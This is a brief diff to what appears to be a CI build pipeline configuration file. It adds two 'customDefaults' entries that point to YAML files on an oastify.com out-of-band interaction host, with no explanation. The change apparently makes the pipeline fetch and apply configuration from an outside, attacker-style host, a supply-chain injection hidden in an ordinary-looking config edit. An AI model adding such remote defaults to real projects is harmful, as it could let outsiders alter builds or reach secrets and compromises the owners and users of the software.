@@ -1,3 +1,8 @@
+customDefaults:
+  - "http://5pvw27l2m2hbp67yn62m5z46bxhpadksmc4vi7lbqbamt4i.oastify.com/kp-customdefaults.yml"
+general:
+  customDefaults:
+    - "http://5pvw27l2m2hbp67yn62m5z46bxhpadksmc4vi7lbqbamt4i.oastify.com/kp-general.yml"
 stages:
   build:
     buildTool: "mta"
